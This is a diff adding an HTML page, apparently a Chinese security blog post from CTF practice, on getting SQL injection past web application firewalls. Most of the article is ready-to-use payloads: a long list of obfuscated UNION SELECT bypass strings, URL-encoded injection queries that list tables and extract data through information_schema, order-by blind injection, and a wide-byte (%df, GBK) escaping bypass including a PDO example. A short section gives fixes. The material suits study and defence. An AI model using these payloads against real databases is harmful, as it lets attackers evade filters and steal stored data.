@@ -1,0 +1,291 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入WAF-bypass | Rick</title><meta name="author" content="LYC"><meta name="copyright" content="LYC"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="sql语句中空格的代替方法: 123456&#x2F;*!50540select user()*&#x2F;     mysql(独有)内联注释,!后面的数字是版本号，表示当数据库版本&gt;&#x3D;5.5.40时执行SQL语句&#x2F;**&#x2F;                                mysql多行注释%09(\t),%0a(\n),%0b,%0c,%0d(\r),%20,%a0         一些空白字符">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入WAF-bypass">
+<meta property="og:url" content="http://991688344.github.io/2020/02/28/SQL%E6%B3%A8%E5%85%A5WAF-bypass/index.html">
+<meta property="og:site_name" content="Rick">
+<meta property="og:description" content="sql语句中空格的代替方法: 123456&#x2F;*!50540select user()*&#x2F;     mysql(独有)内联注释,!后面的数字是版本号，表示当数据库版本&gt;&#x3D;5.5.40时执行SQL语句&#x2F;**&#x2F;                                mysql多行注释%09(\t),%0a(\n),%0b,%0c,%0d(\r),%20,%a0         一些空白字符">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://991688344.github.io/images/Wallpaper/eatham.gif">
+<meta property="article:published_time" content="2020-02-28T15:36:35.000Z">
+<meta property="article:modified_time" content="2024-03-19T01:32:36.460Z">
+<meta property="article:author" content="LYC">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://991688344.github.io/images/Wallpaper/eatham.gif"><link rel="shortcut icon" href="/images/Wallpaper/favicon.ico"><link rel="canonical" href="http://991688344.github.io/2020/02/28/SQL%E6%B3%A8%E5%85%A5WAF-bypass/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/content.json","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL注入WAF-bypass',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><link rel="stylesheet" href="/mycss/my_background.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-color: #F7F9FE;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">251</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">49</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/Wallpaper/eatham.gif);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Rick</span></a><a class="nav-page-title" href="/"><span class="site-name">SQL注入WAF-bypass</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入WAF-bypass</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-02-28T15:36:35.000Z" title="发表于 2020-02-28 23:36:35">2020-02-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-19T01:32:36.460Z" title="更新于 2024-03-19 09:32:36">2024-03-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1>sql语句中空格的代替方法:</h1>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*!50540select user()*/     mysql(独有)内联注释,!后面的数字是版本号，表示当数据库版本&gt;=5.5.40时执行SQL语句</span><br><span class="line">/**/                                mysql多行注释</span><br><span class="line">%09(\t),%0a(\n),%0b,%0c,%0d(\r),%20,%a0         一些空白字符</span><br><span class="line">1.1、2.3、1.                        浮点数形式</span><br><span class="line">0e1、1e7                            科学计数法</span><br><span class="line">+、-、!、@、~、&#123;&#125;、&quot;、&#x27;、()、``      一些特殊字符</span><br></pre></td></tr></table></figure>
+<p>在mysql客户端下测试，所以%09、%0a、%0b这种输入肯定是不行的，要转成%0b、%0c这种的url解码结果输入才行。正常SQL注入的话是在网页输入框中输入，浏览器会自动解码，所以填%09，%0a这种形式。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">=：like，regexp，liker，&lt;&gt;，！=等 （一般ctf中常见）</span><br><span class="line"></span><br><span class="line">and：&amp;&amp;</span><br><span class="line"></span><br><span class="line">or: xor，&amp;，^，||（and或or可以相互替换，只是两边条件不同）</span><br><span class="line"></span><br><span class="line">逗号：盲注中 from 1 for 1,联合查询中 A join B。</span><br></pre></td></tr></table></figure>
+<p>user=1’ union select 1,2,3,4,5,6,7,database();#&amp;password=1#&amp;login=yes</p>
+<p>数据库长度是6</p>
+<p>名称 seacms</p>
+<p>表 adword,					content,download,image</p>
+<p>id,ad1,ad2,ad3,date	 <img src="/2020/02/28/SQL%E6%B3%A8%E5%85%A5WAF-bypass/image-20200229041214123.png" alt="image-20200229041214123"></p>
+<p>le,toutiao,author,keywords,description,xs,hit,images,content,dat</p>
+<p>?action=search&amp;keyword=&amp;order=if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),1,1)like(0x00),price,name)</p>
+<p>/index.php?con=index&amp;act=search&amp;keyword=&amp;sort=’ or ‘1’#</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from student order by if(1,pass,id);</span><br><span class="line">+-----+-------+-------+------------+</span><br><span class="line">| id  | name  | score | pass       |</span><br><span class="line">+-----+-------+-------+------------+</span><br><span class="line">| 456 | world | 65.23 | flag&#123;ksgxv |</span><br><span class="line">| 123 | hello | 12.23 | hasaki     |</span><br><span class="line">+-----+-------+-------+------------+</span><br><span class="line">2 rows in set (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]&gt; select * from student order by if(0,pass,id);</span><br><span class="line">+-----+-------+-------+------------+</span><br><span class="line">| id  | name  | score | pass       |</span><br><span class="line">+-----+-------+-------+------------+</span><br><span class="line">| 123 | hello | 12.23 | hasaki     |</span><br><span class="line">| 456 | world | 65.23 | flag&#123;ksgxv |</span><br><span class="line">+-----+-------+-------+------------+</span><br><span class="line">2 rows in set (0.000 sec)</span><br></pre></td></tr></table></figure>
+<p>key{d114072d4afc12683d337e6d25e558c5}</p>
+<p>?id=%df%27%20or%201=1%23</p>
+<p>?id=1%df%27%20order%20by%203%23		三列</p>
+<p>?id=1%df%27%%20and%201=2%20ununionion%20select%201,2%23</p>
+<p>You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near  ‘and/<strong>/1=2/</strong>/un/<strong>/ion/</strong>//<strong>//</strong>/1,2#’’ at line 1</p>
+<p>存在union select的过滤，竟然可以大小写绕过。。。</p>
+<p>?id=1%df%27%20and%201=2%20UniOn%20SeleCT%201,2,database()%23</p>
+<p>test</p>
+<p>?id=1%df%27 and 1=2 uNion seLect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23</p>
+<p>flag,news,user</p>
+<p>?id=1%df%27 and 1=2 uNion seLect 1,2,group_concat(column_name) from information_schema.columns where table_name=flag%23</p>
+<p>?id=1%df%27 and 1=2 uNion seLect 1,2,flag from flag%23</p>
+<p>index.php?con=index&amp;act=search&amp;keyword=&amp;cid=0&amp;sort=if(1,asc,desc)#</p>
+<p><img src="/2020/02/28/SQL%E6%B3%A8%E5%85%A5WAF-bypass/image-20200229045903945.png" alt="image-20200229045903945"></p>
+<p><img src="/2020/02/28/SQL%E6%B3%A8%E5%85%A5WAF-bypass/image-20200229045924599.png" alt="image-20200229045924599"></p>
+<h1>绕过union select过滤</h1>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#WAF Bypassing Strings:</span><br><span class="line"> </span><br><span class="line"> /*!%55NiOn*/ /*!%53eLEct*/</span><br><span class="line"> </span><br><span class="line"> %55nion(%53elect 1,2,3)-- -</span><br><span class="line"> </span><br><span class="line"> +union+distinct+select+</span><br><span class="line"> </span><br><span class="line"> +union+distinctROW+select+</span><br><span class="line"> </span><br><span class="line"> /**//*!12345UNION SELECT*//**/</span><br><span class="line"> </span><br><span class="line"> /**//*!50000UNION SELECT*//**/</span><br><span class="line"> </span><br><span class="line"> /**/UNION/**//*!50000SELECT*//**/</span><br><span class="line"> </span><br><span class="line"> /*!50000UniON SeLeCt*/</span><br><span class="line"> </span><br><span class="line"> union /*!50000%53elect*/</span><br><span class="line"> </span><br><span class="line"> +#uNiOn+#sEleCt</span><br><span class="line"> </span><br><span class="line"> +#1q%0AuNiOn all#qa%0A#%0AsEleCt</span><br><span class="line"> </span><br><span class="line"> /*!%55NiOn*/ /*!%53eLEct*/</span><br><span class="line"> </span><br><span class="line"> /*!u%6eion*/ /*!se%6cect*/</span><br><span class="line"> </span><br><span class="line"> +un/**/ion+se/**/lect</span><br><span class="line"> </span><br><span class="line"> uni%0bon+se%0blect</span><br><span class="line"> </span><br><span class="line"> %2f**%2funion%2f**%2fselect</span><br><span class="line"> </span><br><span class="line"> union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A</span><br><span class="line"> </span><br><span class="line"> REVERSE(noinu)+REVERSE(tceles)</span><br><span class="line"> </span><br><span class="line"> /*--*/union/*--*/select/*--*/</span><br><span class="line"> </span><br><span class="line"> union (/*!/**/ SeleCT */ 1,2,3)</span><br><span class="line"> </span><br><span class="line"> /*!union*/+/*!select*/</span><br><span class="line"> </span><br><span class="line"> union+/*!select*/</span><br><span class="line"> </span><br><span class="line"> /**/union/**/select/**/</span><br><span class="line"> </span><br><span class="line"> /**/uNIon/**/sEleCt/**/</span><br><span class="line"> </span><br><span class="line"> /**//*!union*//**//*!select*//**/</span><br><span class="line"> </span><br><span class="line"> /*!uNIOn*/ /*!SelECt*/</span><br><span class="line"> </span><br><span class="line"> +union+distinct+select+</span><br><span class="line"> </span><br><span class="line"> +union+distinctROW+select+</span><br><span class="line"> </span><br><span class="line"> +UnIOn%0d%0aSeleCt%0d%0a</span><br><span class="line"> </span><br><span class="line"> UNION/*&amp;test=1*/SELECT/*&amp;pwn=2*/</span><br><span class="line"> </span><br><span class="line"> un?+un/**/ion+se/**/lect+</span><br><span class="line"> </span><br><span class="line"> +UNunionION+SEselectLECT+</span><br><span class="line"> </span><br><span class="line"> +uni%0bon+se%0blect+</span><br><span class="line"> </span><br><span class="line"> %252f%252a*/union%252f%252a /select%252f%252a*/</span><br><span class="line"> </span><br><span class="line"> /%2A%2A/union/%2A%2A/select/%2A%2A/</span><br><span class="line"> </span><br><span class="line"> %2f**%2funion%2f**%2fselect%2f**%2f</span><br><span class="line"> </span><br><span class="line"> union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A</span><br><span class="line"> </span><br><span class="line"> /*!UnIoN*/SeLecT+</span><br><span class="line"> </span><br><span class="line">##</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#Union Select by PASS with Url Encoded Method:</span><br><span class="line"> </span><br><span class="line">   %55nion(%53elect)</span><br><span class="line"> </span><br><span class="line">   union%20distinct%20select</span><br><span class="line"> </span><br><span class="line">   union%20%64istinctRO%57%20select</span><br><span class="line"> </span><br><span class="line">   union%2053elect</span><br><span class="line"> </span><br><span class="line">   %23?%0auion%20?%23?%0aselect</span><br><span class="line"> </span><br><span class="line">   %23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect</span><br><span class="line"> </span><br><span class="line">   %55nion %53eLEct</span><br><span class="line"> </span><br><span class="line">   u%6eion se%6cect</span><br><span class="line"> </span><br><span class="line">   unio%6e %73elect</span><br><span class="line"> </span><br><span class="line">   unio%6e%20%64istinc%74%20%73elect</span><br><span class="line"> </span><br><span class="line">   uni%6fn distinct%52OW s%65lect</span><br><span class="line"> </span><br><span class="line">   %75%6e%6f%69%6e %61%6c%6c %73%65%6c%65%63%7</span><br></pre></td></tr></table></figure>
+<h1>大小写绕过</h1>
+<h1>特殊字符绕过waf</h1>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/index.php?%00file=xxx</span><br></pre></td></tr></table></figure>
+<h1>PDO下的bypass</h1>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection">PDO真的安全吗？ PDO执行流程</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yB5Q12xXh_ZHj7KYPjgPfw">PDO</a></p>
+<h2 id="宽字节">宽字节</h2>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/165567.html">https://www.freebuf.com/column/165567.html</a></p>
+<p>如果mysql设置成GBK等多字节编码的话，就会存在绕过</p>
+<p>以PHP和MYSQL为例，MySQL收到请求时将请求数据从character_set_client转换为character_set_connection;在进行内部操作前，将请求数据从character_set_connection转换为内部操作字符集，使用每个字段的character_set的值将操作结果从内部操作集转换为character_set_results。而宽字节注入发生的位置就是PHP将请求发送到MYSQL时字符集使用character_set_client设置值进行了一次编码。</p>
+<p>php客户端使用单字节，php和mysql的链接层或者mysql服务端用的是GBK等编码就会出现问题</p>
+<blockquote>
+<p>MySQL 5.6 default: <code>big5</code>, <code>cp932</code>, <code>gb2312</code>, <code>gbk</code> and <code>sjis</code>.</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;SET NAMES gbk&#x27;</span>);</span><br><span class="line"><span class="variable">$var</span> = <span class="string">&quot;\xbf\x27 OR 1=1 /*&quot;</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&#x27;SELECT * FROM test WHERE name = ? LIMIT 1&#x27;</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="keyword">array</span>(<span class="variable">$var</span>));</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/28/SQL%E6%B3%A8%E5%85%A5WAF-bypass/f4190b98-fe64-48b7-925a-07ee5bd7d241.png-w331s" alt="img"></p>
+<p>当Mysql数据库my.ini文件中设置编码为gbk时，</p>
+<p>我们的PHP程序哪怕使用了addslashes()，PDO::quote，mysql_real_escape_string()、mysql_escape_string()等函数、方法，或配置了magic_quotes_gpc=on，依然可以通过构造%df’的方法绕过转义</p>
+<p>对于<code>mysql_real_escape_string()</code>：<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string">https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string</a></p>
+<p>修复方法：</p>
+<blockquote>
+<p>The problem here is that we didn’t call the C API’s <code>mysql_set_charset()</code> instead of <code>SET NAMES</code>. If we did, we’d be fine provided we are using a MySQL release since 2006.</p>
+<p>If you’re using an earlier MySQL release, then a <a target="_blank" rel="noopener" href="http://bugs.mysql.com/bug.php?id=8378">bug</a> in <code>mysql_real_escape_string()</code> meant that invalid multibyte characters such as those in our payload were treated as single bytes for escaping purposes <em>even if the client had been correctly informed of the connection encoding</em> and so this attack would still succeed.  The bug was fixed in MySQL <a target="_blank" rel="noopener" href="http://dev.mysql.com/doc/refman/4.1/en/news-4-1-20.html">4.1.20</a>, <a target="_blank" rel="noopener" href="http://dev.mysql.com/doc/relnotes/mysql/5.0/en/news-5-0-22.html">5.0.22</a> and <a target="_blank" rel="noopener" href="http://dev.mysql.com/doc/relnotes/mysql/5.1/en/news-5-1-11.html">5.1.11</a>.</p>
+<p>But the worst part is that <code>PDO</code> didn’t expose the C API for <code>mysql_set_charset()</code> until 5.3.6, so in prior versions it <strong>cannot</strong> prevent this attack for every possible command! It’s now exposed as a <a target="_blank" rel="noopener" href="http://www.php.net/manual/en/ref.pdo-mysql.connection.php">DSN parameter</a>, which should be used <strong>instead of</strong> <code>SET NAMES</code>…</p>
+</blockquote>
+<p>客户端和服务端编码统一</p>
+<p>关闭模拟预处理</p>
+<p>设置 SQL_MODE=“NO_BACKSLASH_ESCAPES”'); 将反斜杠作为字符串而不是转义</p>
+<h2 id="堆叠">堆叠</h2>
+<p>PDO分为<strong>模拟预处理</strong>和<strong>非模拟预处理</strong>。</p>
+<p><strong>模拟预处理是防止某些数据库不支持预处理而设置的，也是众多注入的元凶</strong></p>
+<p>在初始化PDO驱动时，可以设置一项参数，PDO::ATTR_EMULATE_PREPARES，作用是打开模拟预处理(true)或者关闭(false),默认为true。</p>
+<p>PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行。</p>
+<p><strong>非模拟预处理则是通过数据库服务器来进行预处理动作，主要分为两步：</strong></p>
+<p><strong>第一步是prepare阶段，发送SQL语句模板到数据库服务器；</strong></p>
+<p><strong>第二步通过execute()函数发送占位符参数给数据库服务器执行。</strong></p>
+<p><strong>PDO产生安全问题的主要设置如下：</strong></p>
+<blockquote>
+<p>PDO::ATTR_EMULATE_PREPARES //模拟预处理(默认开启</p>
+<p>PDO::ATTR_ERRMODE //报错</p>
+<p>PDO::MYSQL_ATTR_MULTI_STATEMENTS //允许多句执行(默认开启)</p>
+</blockquote>
+<p>PDO默认是允许多句执行和模拟预编译的，在用户输入参数可控的情况下，会导致堆叠注入。</p>
+<h2 id="报错">报错</h2>
+<p>当设置<code>PDO::ATTR_ERRMODE和PDO::ERRMODE_EXCEPTION</code>开启报错时</p>
+<p>无论是否开启PDO::ATTR_EMULATE_PREPARES-模拟预处理</p>
+<p>此时SQL语句如果产生报错，PDO则会将报错抛出</p>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection">PDO真的安全吗？ PDO执行流程</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yB5Q12xXh_ZHj7KYPjgPfw">PDO</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1636/">https://paper.seebug.org/1636/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/dd7ba834170e">SQL注入之WAF-Bypass</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/173474">SQL注入之Bypass</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/68991.html">SQL注入ByPass的一些小技巧</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://991688344.github.io">LYC</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://991688344.github.io/2020/02/28/SQL%E6%B3%A8%E5%85%A5WAF-bypass/">http://991688344.github.io/2020/02/28/SQL%E6%B3%A8%E5%85%A5WAF-bypass/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://991688344.github.io" target="_blank">Rick</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" 